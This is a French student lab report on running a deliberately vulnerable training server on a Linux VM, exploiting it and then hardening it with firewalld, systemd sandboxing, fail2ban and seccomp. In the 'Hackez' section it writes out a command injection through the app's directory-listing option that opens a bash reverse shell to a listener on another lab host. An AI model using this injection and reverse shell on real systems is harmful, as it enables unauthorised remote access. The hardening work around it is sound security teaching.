# linux-10-11

0. Prérequis

🌞 Boom ça commence direct : je veux l'état initial du firewall

```
[hugo@efrei-xmg4agau1 ~]$ systemctl status firewalld
● firewalld.service - firewalld - dynamic firewall daemon
     Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; preset: enabled)
     Active: active (running) since Tue 2024-09-10 04:14:38 EDT; 8min ago
       Docs: man:firewalld(1)
   Main PID: 703 (firewalld)
      Tasks: 2 (limit: 48922)
     Memory: 41.8M
        CPU: 627ms
     CGroup: /system.slice/firewalld.service
             └─703 /usr/bin/python3 -s /usr/sbin/firewalld --nofork --nopid

Sep 10 04:14:37 localhost systemd[1]: Starting firewalld - dynamic firewall daemon...
Sep 10 04:14:38 localhost systemd[1]: Started firewalld - dynamic firewall daemon.
```

```
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --list-services
[sudo] password for hugo:
cockpit dhcpv6-client ssh
```

```
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --permanent --remove-service=cockpit
success
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --permanent --remove-service=dhcpv6-client
success
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --reload
success
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --list-services
ssh
```

🌞 Fichiers /etc/sudoers /etc/passwd /etc/group dans le dépôt de compte-rendu svp !

/etc/sudoers
```
## Allows people in group wheel to run all commands
%wheel  ALL=(ALL)       ALL
```
/etc/passwd
```
hugo:x:1000:1000:hugo:/home/hugo:/bin/bash
```
/etc/group
```
wheel:x:10:hugo
```

I. Partie 1 : Host & Hack

🌞 Télécharger l'application depuis votre VM
```
[hugo@efrei-xmg4agau1 ~]$ curl -O https://gitlab.com/it4lik/b3-csec-2024/-/raw/main/efrei_server
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7044k  100 7044k    0     0  8718k      0 --:--:-- --:--:-- --:--:-- 8707k
```

```
[hugo@efrei-xmg4agau1 ~]$ ls
efrei_server
[hugo@efrei-xmg4agau1 ~]$ chmod +x efrei_server
```

🌞 Lancer l'application efrei_server

```
[hugo@efrei-xmg4agau1 ~]$ LISTEN_ADDRESS=192.168.56.101 ./efrei_server
Warning: You should consider setting the environment variable LOG_DIR. Defaults to /tmp.
Server started. Listening on ('192.168.56.101', 8888)...
```
🌞 Prouvez que l'application écoute sur l'IP que vous avez spécifiée
```
[hugo@efrei-xmg4agau1 ~]$ ss -tuln | grep 8888
tcp   LISTEN 0      100    192.168.56.114:8888      0.0.0.0:*
```
2. Prêts
   
🌞 Se connecter à l'application depuis votre PC

```
hugo@efrei-xmg4agau1 ~$ nc 192.168.56.114 8888
Hello ! Tu veux des infos sur quoi ?
1) cpu
2) ram
3) disk
4) ls un dossier

Ton choix (1, 2, 3 ou 4) :
```

3. Hackez

🌞 Euh bah... hackez l'application !

Du côté client, on constate qu'en sélectionnant l'option 4, il est possible de choisir un dossier à lister avec la commande ls, puis d'injecter une commande via un pipe. Ainsi, nous injectons un reverse shell en bash et configurons un serveur d'écoute sur une autre machine

```
   Ton choix (1, 2, 3 ou 4) : 4
Exécuter la commande ls vers le dossier : /etc | sh -i >& /dev/udp/192.168.56.115/4242 0>&1
```
```
nc -u -lvp -4242
```


II. Servicer le programme

1. Création du service
   
🌞 Créer un service efrei_server.service

```
[Unit]
Description=Super serveur EFREI

[Service]
ExecStart=/usr/local/bin/efrei_app
Environment=LISTEN_ADDRESS=192.168.56.114
```

➜ Une fois le fichier /etc/systemd/system/efrei_server.service créé :
```
[hugo@efrei-xmg4agau1 ~]$ sudo systemctl daemon-reload
```

2. Tests

🌞 Exécuter la commande systemctl status efrei_server
```
[hugo@efrei-xmg4agau1 ~]$ systemctl status efrei_server
○ efrei_server.service - Super serveur EFREI
     Loaded: loaded (/etc/systemd/system/efrei_server.service; static)
     Active: inactive (dead)
```
🌞 Démarrer le service
```
[hugo@efrei-xmg4agau1 ~]$ sudo systemctl status efrei_server
● efrei_server.service - Super serveur EFREI
     Loaded: loaded (/etc/systemd/system/efrei_server.service; static)
     Active: active (running) since Tue 2024-09-10 08:11:33 EDT; 3s ago
   Main PID: 13262 (efrei_app)
      Tasks: 2 (limit: 11099)
     Memory: 32.5M
        CPU: 62ms
     CGroup: /system.slice/efrei_server.service
             ├─13262 /home/hugo/efrei_app
             └─13263 /home/hugo/efrei_app

Sep 10 08:11:33 localhost.localdomain systemd[1]: Started Super serveur EFREI.
```

🌞 Vérifier que le programme tourne correctement
```
[hugo@efrei-xmg4agau1 ~]$ ss -tuln | grep 8888
tcp   LISTEN 0      100    192.168.56.114:8888      0.0.0.0:*
```

III. MAKE SERVICES GREAT AGAIN

1. Restart automatique
Bon pour ça, facile, on va juste faire en sorte que si le programme coupe, il soit relancé automatiquement.


🌞 Ajoutez une clause dans le fichier efrei_server.service pour le restart automatique
```
[Unit]
Description=Super serveur EFREI

[Service]
Type=daemon
ExecStart=/usr/local/bin/efrei_app
Environment=LISTEN_ADDRESS=192.168.56.114

User=hugo
Group=hugo

Restart=always
```
🌞 Testez que ça fonctionne

```
[hugo@efrei-xmg4agau1 ~]$ ps -e | grep efrei_app
  13435 ?        00:00:00 efrei_app
```

```  
[hugo@efrei-xmg4agau1 ~]$ kill 13435
```

```
[hugo@efrei-xmg4agau1 ~]$ ps -e | grep efrei_app
  13462 ?        00:00:00 efrei_app
```

2. Utilisateur applicatif
Lorsqu'un programme s'exécute sur une machine (peu importe l'OS ou le contexte), le programme est toujours exécuté sous l'identité d'un utilisateur.
Ainsi, pendant son exécution, le programme aura les droits de cet utilisateur.

Par exemple, un programme lancé en tant que toto pourra lire un fichier /var/log/toto.log uniquement si l'utilisateur toto a les droits sur ce fichier.

🌞 Créer un utilisateur applicatif
```

[hugo@efrei-xmg4agau1 ~]$ sudo useradd app_user
```


🌞 Modifier le service pour que ce nouvel utilisateur lance le programme efrei_server

```
User=app_user
Group=app_user
```

🌞 Vérifier que le programme s'exécute bien sous l'identité de ce nouvel utilisateur

```
[hugo@efrei-xmg4agau1 ~]$ ps aux | grep efrei_app
efrei_a+   13916  0.2  0.1   2956  1884 ?        Ss   09:22   0:00 /usr/local/bin/efrei_app
efrei_a+   13918  0.1  1.4  33772 25984 ?        S    09:22   0:00 /usr/local/bin/efrei_app
hugo      13924  0.0  0.1   6408  2176 pts/0    S+   09:22   0:00 grep --color=auto efrei_app
```

3. Maîtrisez l'emplacement des fichiers

🌞 Choisir l'emplacement du fichier de logs

```
[hugo@efrei-xmg4agau1 ~]$ sudo mkdir /var/log/efreiapp
```

```
Environment="LOG_DIR=/var/log/efreiapp/"
```

🌞 Maîtriser les permissions du fichier de logs

```
[hugo@efrei-xmg4agau1 bin]$ sudo mkdir /var/log/efreiapp
[hugo@efrei-xmg4agau1 bin]$ sudo chown efreiuser:efreiuser /var/log/efreiapp/
[hugo@efrei-xmg4agau1 bin]$ ls -al /var/log/efreiapp/
total 8
drwxr-xr-x. 2 efreiuser efreiuser   24 Sep 10 10:27 .
drwxr-xr-x. 8 root      root      4096 Sep 10 10:25 ..
-rw-r--r--. 1 efreiuser efreiuser   60 Sep 10 10:27 server.log
```


4. Security hardening
Il existe beaucoup de clauses qu'on peut ajouter dans un fichier .service pour que systemd s'occupe de sécuriser le service, en l'isolant du reste du système par exemple.

Ainsi, une commande est fournie systemd-analyze security qui permet de voir quelles mesures de sécurité on a activé. Un score (un peu arbitraire) est attribué au service ; cela représente son "niveau de sécurité".

Cette commande est très pratique d'un point de vue pédagogique : elle va vous montrer toutes les clauses qu'on peut ajouter dans un .service pour renforcer sa sécurité.

🌞 Modifier le .service pour augmenter son niveau de sécurité

```
[Unit]
Description=Super serveur EFREI
After=network.target

[Service]
ExecStart=/usr/local/bin/efrei_app
Environment=LISTEN_ADDRESS=192.168.56.114
Environment=LOG_DIR=/var/log/efreiapp

# Security: Restrict capabilities and privileges
NoNewPrivileges=true
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
ProtectSystem=full
ProtectHome=true
PrivateTmp=true
ReadOnlyPaths=/usr/local/bin/efrei_app
ReadWritePaths=/var/log/efreiapp
ProtectKernelModules=true
ProtectControlGroups=true
ProtectKernelTunables=true
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
PrivateDevices=true
LockPersonality=true

LimitNOFILE=1024
LimitNPROC=256

Restart=always
RestartSec=5s
TimeoutStopSec=30s

User=efreiuser
Group=efreiuser

[Install]
WantedBy=multi-user.target
```




Partie 4 : Autour de l'application

🌞 Configurer de façon robuste le firewall

```
firewall-cmd --permanent --new-policy myOutputPolicy

firewall-cmd --permanent --policy myOutputPolicy --add-ingress-zone HOST

firewall-cmd --permanent --policy myOutputPolicy --add-egress-zone ANY

firewall-cmd --permanent --policy myOutputPolicy --set-target DROP
```

🌞 Prouver que la configuration est effective

```
[hugo@efrei-xmg4agau1 ~]$ sudo firewall-cmd --list-all
public (active)
  target: default
  icmp-block-inversion: no
  interfaces: enp0s3 enp0s8
  sources:
  services: ssh
  ports: 8888/tcp
  protocols:
  forward: yes
  masquerade: no
  forward-ports:
  source-ports:
  icmp-blocks:
  rich rules:
```

```
[hugo@efrei-xmg4agau1 ~]$ ping 1.1.1.1
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
^C
--- 1.1.1.1 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2012ms
```


2. Protéger l'app contre le flood


🌞 Installer fail2ban sur la machine

```
[hugo@efrei-xmg4agau1 ~]$ sudo systemctl start fail2ban
[hugo@efrei-xmg4agau1 ~]$ sudo systemctl status fail2ban
● fail2ban.service - Fail2Ban Service
     Loaded: loaded (/usr/lib/systemd/system/fail2ban.service; disabled; preset: disabled)
     Active: active (running) since Tue 2024-09-10 11:21:06 EDT; 9s ago
       Docs: man:fail2ban(1)
    Process: 16388 ExecStartPre=/bin/mkdir -p /run/fail2ban (code=exited, status=0/SUCCESS)
   Main PID: 16389 (fail2ban-server)
      Tasks: 3 (limit: 11099)
     Memory: 14.2M
        CPU: 48ms
     CGroup: /system.slice/fail2ban.service
             └─16389 /usr/bin/python3 -s /usr/bin/fail2ban-server -xf start

Sep 10 11:21:06 localhost.localdomain systemd[1]: Starting Fail2Ban Service...
Sep 10 11:21:06 localhost.localdomain systemd[1]: Started Fail2Ban Service.
Sep 10 11:21:06 localhost.localdomain fail2ban-server[16389]: Server ready
```


🌞 Ajouter une jail fail2ban

elle doit lire le fichier de log du service, que vous avez normalement placé dans /var/log/
repérer la ligne de connexion d'un client
blacklist à l'aide du firewall l'IP de ce client
Dans le fichier /etc/fail2ban/jail.local :

```
[efrei_server]
enabled = true
port    = 8888
filter  = efrei_server
logpath = /var/log/efreiapp/server.log
maxretry = 3
bantime = 3600
findtime = 600
```

Et dans le fichier ``/etc/fail2ban/filter.d/efrei_server.conf`

```
[Definition]
failregex = \[\d+\.\d+\] Received '.*' from \('<HOST>', \d+\)
ignoreregex =
```

🌞 Vérifier que ça fonctionne !


```
[hugo@efrei-xmg4agau1 ~]$ sudo fail2ban-client status efrei_server
Status for the jail: efrei_server
|- Filter
|  |- Currently failed: 1
|  |- Total failed:     38
|  `- File list:        /var/log/efreiapp/server.log
`- Actions
   |- Currently banned: 1
   |- Total banned:     1
   `- Banned IP list:   192.168.56.115
```


3. Empêcher le programme de faire des actions indésirables

🌞 Ajouter une politique seccomp au fichier .service

J'ajoute ça au fichier efrei_server.service

```
# Syscall
SystemCallFilter=@default @network write openat newfstatat rt_sigaction close mprotect read pread64 futex brk dup bind socket listen setsockopt gettid getpid epoll_wait
SystemCallFilter=~clone fork execve
```

